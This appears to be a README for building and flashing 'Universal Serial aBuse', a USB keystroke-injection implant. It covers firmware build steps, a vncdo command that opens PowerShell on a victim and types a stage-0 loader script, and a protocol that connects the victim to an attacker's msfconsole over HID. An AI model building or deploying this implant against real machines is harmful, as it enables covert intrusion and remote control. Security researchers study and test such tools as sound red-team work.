Instructions for building the Universal Serial aBuse firmwares and host software

First steps are to install the various compilers for the microprocessors.

OS X and Linux can install the ESP tools by following the instruction in the ESP Open SDK repo:

https://github.com/pfalcon/esp-open-sdk

NB: Make sure to compile the non-standalone version of the esp-open-sdk, otherwise there will
be problems with C types such as uint32_t:

$ make STANDALONE=n

Once the esp-open-sdk has compiled, in the top-level directory, do:

$ wget --content-disposition "http://bbs.espressif.com/download/file.php?id=1046
$ unzip ESP8266_NONOS_SDK_V1.5.1_16_01_08.zip

At this stage, you should be able to change to the esp-vnc directory, and run make.

OS X can also get the AVR compiler by installing the Arduino app, e.g. Caskroom/cask/arduino

Linux can install using apt-get: apt-get install gcc-avr avrdude

Once the avr tools are installed, and avr-gcc is in your PATH, compile the avr firmwares:

cd avr
make

This should build two firmwares, Program_ESP and KeyboardMouseGeneric. i.e you should have .hex files in each directory.

If the ESP sdk was successfully installed, you should also be able to compile the ESP firmware.

cd esp-vnc
make

This should result in a user1.bin file in the firmware directory.

I found the following invocation to be useful in programming both firmwares:

avr/flash_avr avr/Program_ESP/Program_ESP.hex && sleep 2 && \
esp-vnc/flash_esp esp-vnc/firmware/user1.bin && \
avr/flash_avr avr/KeyboardMousegeneric/KeyboardMouseGeneric.hex

Alternatively, with a suitably updated flash_esp, you can do:

esp-vnc/flash_esp esp-vnc/firmware/user1.bin avr/KeyboardMousegeneric/KeyboardMouseGeneric.hex

which does the above for you.

To send vnc commands to it, use vncdotool, available in pip. Note, vncdotool is only compatible with Python2.7, not python 3+

$ vncdo -s esp-link.lan -p password type "echo hello" key enter

A more comprehensive example might be:

$ vncdo -s esp-link.lan -p password key alt-r pause 1 type powershell key enter pause 1 typefile win/USaBuse_PS/USaBuse_PS/read_exec.ps1

An updated vncdo is available at https://github.com/RoganDawes/vncdotool that includes the ability to type out a file.

The hard coded password for the VNC server is "password". Ideally, I should include DES routines in the ESP firmware, so that the password can be changed dynamically.

If esp-link.lan does not resolve, look for port 23 and 5900 on the local network, or check your DHCP server.


The various TLV packets are described here.
TLV_CONTROL packets are packets that contain no attack data per se, but rather
allow for control messages to be passed between various parts of the attack
chain. For instance, TLV_CONTROL_FLOW packets control the flow of data between
the 32U4 and the ESP8266. They have a single data byte, where 1 indicates that
the ESP8266 should suspend sending data until the 32U4 has caught up, and 0
indicates that the ESP8266 may resume sending data.

TLV_CONTROL_CONNECT packets are generated by the 32U4 when the victim indicates
it wants to connect to a certain channel. This is typically in response to the
stage0 loader wanting its next stage, or the final powershell payload wanting
a TCP socket connected to the attacker's controller. CONNECT packets simply
contain the number of the channel that is being requested, where 0 indicates
"no connection", 1 indicates "1st stage loader", and 2 indicates "msfconsole".

The powershell payload indicates which connection it wants by sending a
"zero-length HID report" (i.e. the 1st byte of the report data is 0), with
the following byte indicating the desired channel.

The basic idea is as follows:
Device is connected via USB, current channel = 0
Initially, the Generic HID reports will reflect a length of 0, and channel 0
This is essentially what they are doing by default, returning a payload of 64 zeroes.

Yet to be implemented, the Keyboard could periodically send a toggle key event,
such as a numlock or scroll lock event, until it receives a corresponding report
from the host. At this point, the device can assume that it has been successfully
enumerated. It would be reasonable for the device to then request the VNC keystrokes
that would run the powershell stage 0 script. In order to support on-demand triggered
VNC scripts, one could potentially run the VNC client in "connect-back" mode.
This may require additional code in vncdo to support this, but could otherwise
be implemented using a double "LISTEN" tunnel, where the device hits the first
listener, and waits until the vncdo instance connects to the second. This should
probably be connection 1.

Subsequently, if the typed stage 0 script requires it, it may request another
connection. This can be done by sending a "zero-length" HID report, where byte[0]
of the report == 0, byte[1] indicates the connection number, and subsequent bytes
could even contain the IP Address and port to connect to. If the IP address is
all zeroes, the ESP could open a listening socket instead. This could help to
reduce the amount of configuration required in the device itself.
